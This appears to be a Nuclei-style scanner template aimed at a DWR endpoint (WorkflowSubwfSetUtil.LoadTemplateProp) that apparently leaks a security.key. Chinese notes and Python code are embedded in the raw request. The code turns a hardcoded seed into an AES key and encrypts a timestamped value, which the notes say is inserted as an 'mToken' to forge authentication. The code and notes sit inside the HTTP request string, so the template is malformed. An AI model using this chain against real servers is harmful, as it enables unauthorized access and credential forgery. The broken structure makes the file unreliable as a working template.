http:
- raw:
  - "POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\n\n取security.key进行AES加密\nimport hashlib\nimport time\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\ndef encrypt(data, seed_str):\n    seed = seed_str.encode('utf-8')\n    first_hash = hashlib.sha1(seed).digest()\n    key_bytes = hashlib.sha1(first_hash).digest()[:16]\n    cipher = AES.new(key_bytes, AES.MODE_ECB)\n    plaintext = data.encode('utf-8')\n    padded = pad(plaintext, AES.block_size)\n    ciphertext = cipher.encrypt(padded)\n    return ciphertext.hex().upper()\n\nif __name__ == \"__main__\":\n    data = \"1;1;\" + str(int(time.time() * 1000))\n    seed = \"4bbc40a9-7786-4b\"\n    print(encrypt(data, seed))\n\n取AES加密后值\nCEF202B9A449256743022A93A4B5E494AB411D1AF909892C2CDE3B48E984DD49\n\n3、将AES值带入到mToken中"
  redirects: false
  matchers:
  - status:
    - 200
    type: status
